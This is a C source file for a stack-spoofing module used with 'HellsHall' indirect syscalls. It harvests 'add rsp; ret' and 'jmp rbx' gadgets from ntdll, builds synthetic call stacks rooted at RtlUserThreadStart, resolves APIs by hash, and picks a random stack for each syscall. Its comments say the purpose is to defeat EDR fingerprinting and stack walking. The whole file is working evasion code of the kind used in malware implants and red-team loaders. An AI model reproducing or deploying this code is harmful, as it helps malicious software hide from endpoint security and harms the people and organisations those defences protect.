#include "StackSpoof.h"
#include "Common.h"
#include "ApiHashing.h"
#include "../Engine/NtApi.h"
#include <intrin.h>

/* Declared in HellsHall.asm— used in Init */
extern ULONG64 g_SpoofSavedRsp;
extern ULONG64 g_SpoofSyntheticStack[32];
extern DWORD   g_SpoofEnabled;

/* Exported to HellsHall.asm — pool of pre-built configs and valid count. */
SPOOF_STACK_CONFIG g_SpoofConfigPool[SPOOF_POOL_MAX] = { 0 };
ULONG              g_SpoofPoolCount = 0;

static_assert(sizeof(SPOOF_STACK_CONFIG) == 256, "SPOOF_STACK_CONFIG size drift");

/* Gadget pools — collected during init, used to build configs. */
static PVOID  g_AddRspPool[SPOOF_POOL_MAX]  = { 0 };
static DWORD  g_AddRspDelta[SPOOF_POOL_MAX]  = { 0 };
static ULONG  g_AddRspCount                  = 0;

static PVOID  g_JmpRbxPool[SPOOF_POOL_MAX]   = { 0 };
static DWORD  g_JmpRbxDelta[SPOOF_POOL_MAX]  = { 0 };
static ULONG  g_JmpRbxCount                  = 0;

static PVOID  g_RtlThreadStart = NULL;

/* Parses UNWIND_INFO and computes RSP deltas for the prologue.
 * Returns TRUE on clean parse. Output:
 *   pAllocDelta = sum of UWOP_ALLOC_SMALL/LARGE (matches `add rsp, imm` epilogue)
 *   pTotalDelta = alloc + 8*pushes (full stack frame size)
 * Advancing `i` correctly for every opcode prevents desync when the array
 * contains SAVE_NONVOL / XMM128 / MACHFRAME entries. */
static BOOL ParseUnwind(PBYTE pBase, DWORD unwindInfoRva, DWORD* pAllocDelta, DWORD* pTotalDelta) {
    PBYTE pUI = pBase + unwindInfoRva;
    BYTE  countOfCodes = pUI[2];
    DWORD allocDelta = 0, totalDelta = 0;
    for (BYTE i = 0; i < countOfCodes; ) {
        BYTE opcode = pUI[4 + i * 2 + 1] & 0x0F;
        BYTE opinfo = (pUI[4 + i * 2 + 1] >> 4) & 0x0F;
        switch (opcode) {
        case 0: /* UWOP_PUSH_NONVOL */ totalDelta += 8; i += 1; break;
        case 1: /* UWOP_ALLOC_LARGE */
            if (opinfo == 0) {
                DWORD sz = *(WORD*)(pUI + 4 + (i + 1) * 2) * 8;
                allocDelta += sz; totalDelta += sz; i += 2;
            } else {
                DWORD sz = *(DWORD*)(pUI + 4 + (i + 1) * 2);
                allocDelta += sz; totalDelta += sz; i += 3;
            }
            break;
        case 2: /* UWOP_ALLOC_SMALL */ {
            DWORD sz = (DWORD)(opinfo * 8 + 8);
            allocDelta += sz; totalDelta += sz; i += 1;
        } break;
        case 3: /* UWOP_SET_FPREG        */ i += 1; break;
        case 4: /* UWOP_SAVE_NONVOL      */ i += 2; break;
        case 5: /* UWOP_SAVE_NONVOL_FAR  */ i += 3; break;
        case 8: /* UWOP_SAVE_XMM128      */ i += 2; break;
        case 9: /* UWOP_SAVE_XMM128_FAR  */ i += 3; break;
        case 10:/* UWOP_PUSH_MACHFRAME   */ i += 1; break;
        default: i += 1; break;
        }
    }
    *pAllocDelta = allocDelta;
    *pTotalDelta = totalDelta;
    return TRUE;
}

/* Collects all "add rsp, X; ret" gadgets with distinct deltas from ntdll's
 * exception directory.  Each unique delta (8/16/24 bytes) produces a different
 * synthetic stack layout, enabling per-call randomization in HellsHallSyscall.
 *
 * Constraint: delta < 0x20 keeps jmp_rbx at slot [1+d1/8] ≤ slot 4,
 * strictly before the forwarded args zone [5..10] (rsp+0x28..rsp+0x50). */
static BOOL FindAddRspGadgets(PBYTE pBase) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    IMAGE_DATA_DIRECTORY pdataDir = pNt->OptionalHeader.DataDirectory[3];
    if (!pdataDir.VirtualAddress || !pdataDir.Size) return FALSE;

    PRUNTIME_FUNCTION pRF = (PRUNTIME_FUNCTION)(pBase + pdataDir.VirtualAddress);
    DWORD count = pdataDir.Size / sizeof(RUNTIME_FUNCTION);
    g_AddRspCount = 0;

    for (DWORD i = 0; i < count && g_AddRspCount < SPOOF_POOL_MAX; i++) {
        DWORD funcSize = pRF[i].EndAddress - pRF[i].BeginAddress;
        if (funcSize < 5 || funcSize > 256) continue;

        if (pRF[i].UnwindData & 1) continue;
        DWORD allocDelta = 0, totalDelta = 0;
        if (!ParseUnwind(pBase, pRF[i].UnwindData, &allocDelta, &totalDelta)) continue;
        if (allocDelta == 0 || allocDelta >= 0x20 || (allocDelta & 7)) continue;

        /* Skip duplicate deltas. */
        BOOL dup = FALSE;
        for (ULONG k = 0; k < g_AddRspCount; k++) {
            if (g_AddRspDelta[k] == allocDelta) { dup = TRUE; break; }
        }
        if (dup) continue;

        PBYTE pFunc = pBase + pRF[i].BeginAddress;
        for (DWORD j = 0; j + 4 < funcSize; j++) {
            if (pFunc[j] == 0x48 && pFunc[j + 1] == 0x83 &&
                pFunc[j + 2] == 0xC4 && pFunc[j + 3] == (BYTE)allocDelta &&
                pFunc[j + 4] == 0xC3) {
                g_AddRspPool[g_AddRspCount]  = pFunc + j;
                g_AddRspDelta[g_AddRspCount] = allocDelta;
                g_AddRspCount++;
                break;
            }
        }
    }
    return g_AddRspCount > 0;
}

/* Collects "jmp rbx" (FF E3) gadgets from every MEM_EXECUTE section of ntdll.
 * Multiple gadgets are collected so HellsHallSyscall can randomize which one
 * is used for each syscall, defeating EDR fingerprinting of a single gadget
 * address across all calls.  Each candidate must sit inside a RUNTIME_FUNCTION
 * with parseable UNWIND_INFO — EDR stack walkers use that frame to unwind
 * through the gadget. */
static BOOL FindJmpRbxGadgets(PBYTE pBase) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    IMAGE_DATA_DIRECTORY pdataDir = pNt->OptionalHeader.DataDirectory[3];
    if (!pdataDir.VirtualAddress || !pdataDir.Size) return FALSE;

    PRUNTIME_FUNCTION pRF = (PRUNTIME_FUNCTION)(pBase + pdataDir.VirtualAddress);
    DWORD rfCount = pdataDir.Size / sizeof(RUNTIME_FUNCTION);
    g_JmpRbxCount = 0;

    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    for (int s = 0; s < pNt->FileHeader.NumberOfSections && g_JmpRbxCount < SPOOF_POOL_MAX; s++, pSec++) {
        if (!(pSec->Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;

        PBYTE pSecData = pBase + pSec->VirtualAddress;
        DWORD secSize = pSec->Misc.VirtualSize;

        for (DWORD j = 0; j + 1 < secSize && g_JmpRbxCount < SPOOF_POOL_MAX; j++) {
            if (pSecData[j] != 0xFF || pSecData[j + 1] != 0xE3) continue;

            DWORD rva = (DWORD)((pSecData + j) - pBase);
            for (DWORD k = 0; k < rfCount; k++) {
                if (rva >= pRF[k].BeginAddress && rva < pRF[k].EndAddress) {
                    if (pRF[k].UnwindData & 1) break;
                    DWORD allocDelta = 0, totalDelta = 0;
                    if (!ParseUnwind(pBase, pRF[k].UnwindData, &allocDelta, &totalDelta)) break;
                    g_JmpRbxPool[g_JmpRbxCount]  = pSecData + j;
                    g_JmpRbxDelta[g_JmpRbxCount] = allocDelta;
                    g_JmpRbxCount++;
                    break;
                }
            }
        }
    }

    return g_JmpRbxCount > 0;
}

/* Identifies which init step failed; caller maps it to a distinct exit code. */
DWORD g_SpoofInitFailStep = 0;

/* Builds a pre-computed synthetic stack for a given add_rsp delta and
 * jmp_rbx gadget.  Layout (QWORD indices):
 *   [0]              = add_rsp, d1; ret          (frame 1 gadget)
 *   [1 .. d1/8]      = padding (zero)
 *   [d1/8 + 1]       = jmp rbx                   (frame 2 gadget)
 *   [d1/8+d2/8 + 2]  = RtlUserThreadStart        (EDR-visible root)
 *   [5..10]          = forwarded syscall args     (filled at pivot time)
 * Caller must ensure d1/8+d2/8+2 is outside [5..10] so arg forwarding
 * does not overwrite RtlUserThreadStart. */
static void BuildSyntheticStack(SPOOF_STACK_CONFIG* pCfg, PVOID addRspAddr, DWORD d1,
                                 PVOID jmpRbxAddr, DWORD d2, PVOID rtlStart) {
    custom_memset(pCfg, 0, sizeof(SPOOF_STACK_CONFIG));
    pCfg->stack[0] = (ULONG64)addRspAddr;
    pCfg->stack[(d1 / 8) + 1] = (ULONG64)jmpRbxAddr;
    pCfg->stack[(d1 / 8) + (d2 / 8) + 2] = (ULONG64)rtlStart;
}

BOOL StackSpoof_Init(void) {
    g_SpoofInitFailStep = 0;
    g_SpoofPoolCount = 0;

    PBYTE pNtdll = (PBYTE)GetModuleHandleH(g_Hash_ntdll);
    if (!pNtdll)                      { g_SpoofInitFailStep = 1; return FALSE; }
    if (!FindAddRspGadgets(pNtdll))   { g_SpoofInitFailStep = 2; return FALSE; }
    if (!FindJmpRbxGadgets(pNtdll))   { g_SpoofInitFailStep = 3; return FALSE; }

    HMODULE hNtdll = (HMODULE)pNtdll;
    g_RtlThreadStart = (PVOID)GetProcAddressH(hNtdll, g_Hash_RtlUserThreadStart);
    if (!g_RtlThreadStart) { g_SpoofInitFailStep = 4; return FALSE; }

    /* Build one config per distinct add_rsp delta.  For each d1, search the
     * jmp_rbx pool for a d2 that places RtlUserThreadStart outside the
     * forwarded-args zone [5..10].  Preferred: root past the zone (d1+d2>0x40);
     * acceptable: root before the zone (d1+d2<0x18, rare).  If no gadget
     * satisfies the constraint, fall back to the first available — execution
     * stays correct, only the EDR-visible root frame is suboptimal. */
    for (ULONG i = 0; i < g_AddRspCount && g_SpoofPoolCount < SPOOF_POOL_MAX; i++) {
        DWORD d1     = g_AddRspDelta[i];
        PVOID jmpRbx = g_JmpRbxPool[0];
        DWORD d2     = g_JmpRbxDelta[0];

        for (ULONG j = 0; j < g_JmpRbxCount; j++) {
            DWORD rootSlot = (d1 / 8) + (g_JmpRbxDelta[j] / 8) + 2;
            if (rootSlot < 5 || rootSlot > 10) {
                jmpRbx = g_JmpRbxPool[j];
                d2     = g_JmpRbxDelta[j];
                break;
            }
        }

        BuildSyntheticStack(&g_SpoofConfigPool[g_SpoofPoolCount],
                            g_AddRspPool[i], d1, jmpRbx, d2, g_RtlThreadStart);
        g_SpoofPoolCount++;
    }

    if (g_SpoofPoolCount == 0) {
        BuildSyntheticStack(&g_SpoofConfigPool[0],
                            g_AddRspPool[0], g_AddRspDelta[0],
                            g_JmpRbxPool[0], g_JmpRbxDelta[0],
                            g_RtlThreadStart);
        g_SpoofPoolCount = 1;
    }

    /* Populate the active synthetic stack with config 0.  This ensures
     * the FallbackStatic path in HellsHall.asm always has valid gadgets,
     * even if the per-call randomization copy fails. */
    custom_memcpy(g_SpoofSyntheticStack, g_SpoofConfigPool[0].stack,
                  sizeof(g_SpoofConfigPool[0].stack));

    g_SpoofEnabled = 1;
    return TRUE;
}

void StackSpoof_Cleanup(void) {
    g_SpoofEnabled = 0;
}

/* Called from HellsHall.asm SpoofPath.  Picks a random config via rdtsc and
 * copies its stack layout into g_SpoofSyntheticStack.  HellsHall.asm saves
 * and restores rcx/rdx/r8/r9 around this call so syscall args are intact. */
void StackSpoof_CopyRandomConfig(void) {
    if (g_SpoofPoolCount == 0) return;
    ULONG index = (ULONG)(__rdtsc() % (ULONG64)g_SpoofPoolCount);
    custom_memcpy(g_SpoofSyntheticStack, g_SpoofConfigPool[index].stack,
                  sizeof(g_SpoofConfigPool[0].stack));
}